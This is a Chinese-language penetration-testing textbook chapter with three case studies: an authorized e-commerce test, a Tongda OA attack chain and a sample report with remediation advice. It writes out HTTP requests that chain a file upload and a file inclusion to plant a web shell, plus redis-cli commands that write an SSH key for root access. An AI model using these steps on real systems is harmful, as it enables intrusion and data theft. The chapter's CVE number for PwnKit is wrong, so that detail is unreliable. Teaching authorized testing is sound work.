# 实战案例

### 7.1 案例1：某企业Web应用渗透测试完整流程

**项目背景**：某电商企业委托对其在线购物平台进行灰盒渗透测试。测试范围包括Web前端、后端API、管理后台。提供普通用户账号一个。

**第1步：前期交互**
- 签署授权书，确认测试范围为`shop.target.com`和`admin.target.com`。
- 测试时间窗口：工作日22:00-06:00，避开业务高峰。
- 约定不进行DDoS测试，不删除数据，发现严重漏洞立即通知。

**第2步：信息收集**
- 被动收集：WHOIS查询发现注册人为企业IT部门。DNS记录发现`test.shop.target.com`和`staging.shop.target.com`测试环境。GitHub搜索发现企业员工泄露了包含API密钥的配置文件。
- 主动收集：Nmap扫描发现Web服务器（443端口）、SSH（22端口）、Redis（6379端口，可能未授权访问）。目录爆破发现`/api/v1/`、`/api/docs/`（Swagger文档泄露）、`/.git/`（Git仓库泄露）。
- 指纹识别：前端使用Vue.js，后端API使用Node.js/Express，数据库为MySQL，使用Redis做缓存。管理后台使用独立的Angular前端。

**第3步：威胁建模**
- 攻击面1：Swagger文档泄露的API接口未认证直接访问。
- 攻击面2：Git仓库泄露源码，可分析代码级漏洞。
- 攻击面3：Redis 6379端口暴露在外网。
- 攻击面4：管理后台的认证和授权机制。
- 攻击路径：Git泄露源码 → 分析代码漏洞 → 利用API漏洞获取用户数据 → 越权访问管理后台。

**第4步：漏洞分析**
- 自动化扫描：Burp Scanner扫描发现多个反射型XSS和SQL注入潜在点。
- 手动验证：Swagger文档泄露的API包含`GET /api/v1/users/{id}`接口，修改id参数可访问其他用户信息（水平越权）。`GET /api/v1/admin/users`接口缺少权限验证（垂直越权）。
- Git泄露：通过`git log`恢复历史提交，发现曾提交过包含数据库密码的配置文件`config/database.js`。
- Redis未授权：连接Redis发现可执行`FLUSHALL`、`CONFIG SET dir`等命令，可写入SSH公钥到`/root/.ssh/authorized_keys`。

**第5步：漏洞利用**
- 利用水平越权漏洞遍历用户ID，获取全量用户信息（姓名、手机号、地址、订单记录）。
- 利用垂直越权漏洞访问管理后台API，获取管理员功能（用户管理、订单查看、系统配置）。
- Redis未授权：通过写入SSH公钥获取服务器root权限。
- 在服务器上发现数据库配置文件，连接MySQL获取全量用户密码哈希（bcrypt）和交易记录。

**第6步：后渗透**
- 通过Redis获取的服务器权限为跳板，探测内网。
- 发现内网管理网段`10.0.0.0/24`，其中`10.0.0.5`运行内部管理系统。
- 利用外网获取的管理员凭据尝试登录内部管理系统，成功登录。
- 内部系统存在文件上传漏洞，上传Web Shell获取内网服务器权限。
- 验证可访问内部财务数据库（脱敏截图记录）。

**第7步：报告编写**
- 发现严重漏洞4个：Redis未授权访问、API水平越权（全量用户泄露）、API垂直越权（管理后台接管）、Git仓库泄露源码。
- 高危漏洞3个：SQL注入、内网管理系统文件上传、数据库密码泄露。
- 中危漏洞5个：反射型XSS、Swagger文档泄露、弱密码策略等。
- 低危漏洞6个：缺失安全头、Cookie属性不安全等。
- 报告包含完整攻击路径图、风险分布统计和优先修复建议。

### 7.2 案例2：从信息收集到获取Shell的完整攻击链

**目标**：某企业内网办公系统。

**阶段1：信息收集**
- 子域名枚举发现`oa.target.com`办公自动化系统。
- 指纹识别：通达OA（Tongda OA）系统。
- 版本探测：通过特征文件`/inc/reg.php`确认版本为Tongda OA 11.5。

**阶段2：漏洞发现**
- 搜索Tongda OA 11.5已知漏洞，发现多个N-day漏洞。
- 关键漏洞：`/module/appbuilder/assets/print.php`存在任意文件包含漏洞。
- 配合`/ispirit/interface/gateway.php`文件上传漏洞实现RCE。

**阶段3：漏洞利用**
```
# 步骤1：利用文件上传漏洞上传包含恶意代码的文件
POST /ispirit/interface/gateway.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

json={"method":"putauth","data":{"userid":"1","file":"../../attach/243/shell.php"}}&P=&json=&key=&userid=admin

# 步骤2：利用文件包含漏洞执行上传的PHP文件
POST /module/appbuilder/assets/print.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

url=../../attach/243/shell.php
```

**阶段4：后渗透**
- 获取Web Shell后执行`whoami`确认权限为`www-data`。
- 查看系统信息：Ubuntu 20.04，内核5.4.0。
- 发现SUID程序`/usr/bin/pkexec`，利用CVE-2022-2634（PwnKit）提权至root。
- 获取`/etc/shadow`文件，使用hashcat破解弱密码。
- 通过读取数据库配置获取MySQL凭据，连接数据库获取OA系统用户信息。

**阶段5：横向移动**
- 使用破解的系统密码尝试SSH登录其他内网服务器。
- 发现`192.168.1.10`使用相同密码，成功登录。
- 该服务器为内部代码仓库（GitLab），获取源码访问权限。

**成果总结**：从外网信息收集开始，利用已知漏洞获取初始访问权限，提权后横向移动获取内网多台服务器权限和核心数据。

### 7.3 案例3：渗透测试报告范例

以下是一份精简版渗透测试报告示例：

---

**执行摘要**

本次测试于2026年X月X日至X月X日对XXX在线购物平台进行渗透测试。测试范围为`shop.target.com`（前端及API）和`admin.target.com`（管理后台）。

测试共发现安全漏洞18个，其中严重4个、高危3个、中危5个、低危6个。

最严重风险为Redis未授权访问漏洞，攻击者可直接获取服务器root权限。配合API越权漏洞，可导致全量用户数据（约50万用户）泄露。建议立即进行应急修复。

**漏洞分布统计**：

| 等级 | 数量 | 典型漏洞 |
|------|------|---------|
| 严重 | 4 | Redis未授权、API水平越权、API垂直越权、源码泄露 |
| 高危 | 3 | SQL注入、文件上传、数据库凭据泄露 |
| 中危 | 5 | 反射型XSS、Swagger泄露、弱密码策略、CSRF、会话固定 |
| 低危 | 6 | 缺失安全头、Cookie不安全、目录列表、版本信息泄露等 |

**优先修复建议**：
1. 立即（24小时内）：修复Redis未授权访问（限制访问+认证）、修复API越权漏洞。
2. 短期（1周内）：修复SQL注入、文件上传、源码泄露、数据库凭据轮换。
3. 中期（1月内）：修复XSS、CSRF、会话管理等中低危漏洞。
4. 长期：建立安全开发流程，定期安全评估。

---

**漏洞详情示例——Redis未授权访问**

| 项目 | 内容 |
|------|------|
| 漏洞名称 | Redis服务未授权访问 |
| 风险等级 | 严重（CVSS 9.8） |
| CVSS向量 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| 漏洞描述 | 目标服务器6379端口暴露Redis服务且未配置认证，攻击者可无需密码直接连接并执行任意Redis命令 |
| 影响评估 | 攻击者可通过以下方式获取服务器权限：1) 写入SSH公钥到/root/.ssh/authorized_keys；2) 写入Crontab定时任务执行反弹Shell；3) 写入Web Shell到Web目录；4) 读取/修改Redis中的缓存数据 |
| 复现步骤 | 1. 使用redis-cli连接：`redis-cli -h target.com -p 6379`<br>2. 执行`CONFIG SET dir /root/.ssh`<br>3. 执行`CONFIG SET dbfilename authorized_keys`<br>4. 执行`SET sshkey "ssh-rsa AAAA...attacker@key"`<br>5. 执行`SAVE`<br>6. 使用对应私钥SSH登录：`ssh -i id_rsa root@target.com` |
| 修复建议 | 1. 绑定本地地址：`bind 127.0.0.1`<br>2. 启用认证：`requirepass <strong_password>`<br>3. 修改默认端口<br>4. 配置防火墙规则限制6379端口仅内网访问<br>5. 禁用危险命令：`rename-command CONFIG ""`<br>6. 以非root用户运行Redis<br>7. 升级Redis至最新版本 |
| 参考资料 | Redis安全指南、CWE-306 Missing Authentication for Critical Function |
